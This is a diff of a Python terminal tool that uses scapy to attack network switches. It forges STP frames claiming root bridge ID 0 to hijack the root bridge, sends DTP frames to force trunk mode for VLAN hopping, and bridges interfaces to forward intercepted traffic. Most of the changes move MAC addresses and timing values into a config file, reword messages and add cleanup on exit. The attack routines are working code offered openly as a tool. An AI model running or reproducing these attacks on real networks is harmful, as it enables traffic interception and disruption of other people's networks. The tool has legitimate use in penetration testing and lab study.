@@ -17,14 +17,14 @@ try:
     with open('configs/config', 'r') as f:
         config = json.load(f, object_hook=lambda c: SimpleNamespace(**c))
 except FileNotFoundError:
-    print("Config file not found.")
+    print("Config file not found int ./configs")
     sys.exit(1)
 
 try:
     with open('configs/attacks', 'r') as f:
         attacks = json.load(f, object_hook=lambda atk: SimpleNamespace(**atk))
 except FileNotFoundError:
-    print("Config file not found.")
+    print("Attack file not found in ./configs")
     sys.exit(1)
 
 choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attacks) if attr != 'quit' and getattr(getattr(attacks, attr), 'enabled', False)] + [getattr(attacks, 'quit')]
@@ -47,16 +47,15 @@ Use Arrow keys to navigate and Enter to choose an option
 
 
 def hijack(event, interfaces, pkt):
-    mac = "00:00:00:00:00:01"
-    pkt[0].src = mac
+    pkt[0].src = attacks.hijack.settings.mac_address
     pkt[0].rootid = 0
-    pkt[0].rootmac = mac
+    pkt[0].rootmac = attacks.hijack.settings.mac_address
     pkt[0].bridgeid = 0
-    pkt[0].bridgemac = mac
+    pkt[0].bridgemac = attacks.hijack.settings.mac_address
     while not event.is_set():
         for interface in interfaces:
             sendp(pkt[0], loop=0, verbose=0, iface=interface)
-        sleep(config.interval.stp)
+        sleep(attacks.hijack.settings.interval)
 
 
 def launch_stp_atk(interfaces):
@@ -89,11 +88,11 @@ def dtp_atk(iface: list, mac_addr=str(RandMAC())):
     while not stop_dtp_event.is_set():
         for interface in iface:
             sendp(p, iface=interface, verbose=0)
-        sleep(config.interval.dtp)
+        sleep(attacks.trunk.settings.interval)
 
 
 def launch_dtp_atk(interfaces: list):
-    dtp_thread = threading.Thread(target=dtp_atk, args=(interfaces, "0c:7c:e8:46:d5:95",))
+    dtp_thread = threading.Thread(target=dtp_atk, args=(interfaces, attacks.trunk.settings.mac_address,))
     dtp_thread.daemon = True
     dtp_thread.start()
 
@@ -144,9 +143,9 @@ def replace_choice(old, new):
     choices.remove(old)
 
 
-def gui(stdscr):
+def gui(stdscr_gui):
     display_banner(f"\n\nVersion: {config.version}\n\n\nPress any key to Start")
-    stdscr.getch()
+    stdscr_gui.getch()
 
     if len(system_interfaces) > 2:
         interface1 = select_interface(1)
@@ -158,11 +157,11 @@ def gui(stdscr):
         selected_interfaces = system_interfaces
     elif len(system_interfaces) == 1:
         interface1 = system_interfaces[0]
-        interface2 = "No interface available: Packet forwarding cannot be enabled."
+        interface2 = "No interface available - Packet forwarding cannot be enabled."
         selected_interfaces = system_interfaces
         choices.remove(attacks.forward.start)
     else:
-        print("You do not have enough network interfaces. Exiting...")
+        print("You need at least 1 network interface. Exiting...")
         sys.exit(1)
 
     while True:
@@ -171,56 +170,55 @@ def gui(stdscr):
 
         if action == attacks.quit:
             disable_forwarding("hijack_stp_br")
-            curses.endwin()
-            sys.exit(0)
+            return
 
         if action == attacks.hijack.start:
-            stdscr.addstr(f"\nAttempting to hijacking root bridge...\n")
-            stdscr.refresh()
+            stdscr_gui.addstr(f"\nAttempting to hijacking root bridge...\n")
+            stdscr_gui.refresh()
             stop_hijack_event.clear()
             launch_stp_atk(selected_interfaces)
             replace_choice(attacks.hijack.start, attacks.hijack.stop)
-            stdscr.addstr(f"Hijack started. Press any key to return\n")
+            stdscr_gui.addstr(f"Hijack started. Press any key to return\n")
 
         elif action == attacks.hijack.stop:
-            stdscr.addstr(f"\nStopping root bridge hijacking...\n")
-            stdscr.refresh()
+            stdscr_gui.addstr(f"\nStopping root bridge hijacking...\n")
+            stdscr_gui.refresh()
             stop_hijack_event.set()
-            sleep(3)  # Wait for while loop to exit
+            sleep(config.stop_time)
             replace_choice(attacks.hijack.stop, attacks.hijack.start)
-            stdscr.addstr(f"Stopped hijack. Press any key to return\n")
+            stdscr_gui.addstr(f"Stopped hijack. Press any key to return\n")
 
         elif action == attacks.forward.start:
-            enable_forwarding(config.bridge_name, selected_interfaces)
+            enable_forwarding(attacks.forward.settings.bridge_name, selected_interfaces)
             replace_choice(attacks.forward.start, attacks.forward.stop)
-            stdscr.addstr(f"\nEnabled packet forwarding. Press any key to return\n")
+            stdscr_gui.addstr(f"\nEnabled packet forwarding. Press any key to return\n")
 
         elif action == attacks.forward.stop:
-            disable_forwarding(config.bridge_name)
+            disable_forwarding(attacks.forward.settings.bridge_name)
             replace_choice(attacks.forward.stop, attacks.forward.start)
-            stdscr.addstr(f"Disabled packet forwarding. Press any key to return\n")
+            stdscr_gui.addstr(f"\nDisabled packet forwarding. Press any key to return\n")
 
         elif action == attacks.trunk.start:
-            stdscr.addstr(f"\nAttempting to enable trunking on...\n")
-            stdscr.refresh()
+            stdscr_gui.addstr(f"\nAttempting to enable trunking on...\n")
+            stdscr_gui.refresh()
             stop_dtp_event.clear()
             launch_dtp_atk(selected_interfaces)
             replace_choice(attacks.trunk.start, attacks.trunk.stop)
-            stdscr.addstr(f"Enabled trunking. Press any key to return")
+            stdscr_gui.addstr(f"Enabled trunking. Press any key to return")
 
         elif action == attacks.trunk.stop:
-            stdscr.addstr(f"\nDisabling trunk...\nNote: Switch may take awhile to recognise that trunk is gone.\n")
-            stdscr.refresh()
+            stdscr_gui.addstr(f"\nDisabling trunk...\nNote: Switch may take awhile to recognise that trunk is gone.\n")
+            stdscr_gui.refresh()
             stop_dtp_event.set()
-            sleep(3)  # Wait for while loop to exit
+            sleep(config.stop_time)
             replace_choice(attacks.trunk.stop, attacks.trunk.start)
-            stdscr.addstr(f"Trunk disabled. Press any key to return\n")
+            stdscr_gui.addstr(f"Trunk disabled. Press any key to return\n")
 
         ##################################################################
         # Add more functions here
         ##################################################################
 
-        stdscr.getch()
+        stdscr_gui.getch()
 
 
 def check_terminal_size(min_width, min_height):
@@ -258,9 +256,17 @@ def main():
         sys.exit(1)
 
     # Initialise curse GUI
-
     curses.wrapper(gui)
 
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        try:
+            disable_forwarding(config.bridge_name)
+        except Exception:
+            pass
+    finally:
+        curses.endwin()
+        print("Successfully quit from program. Goodbye :)")
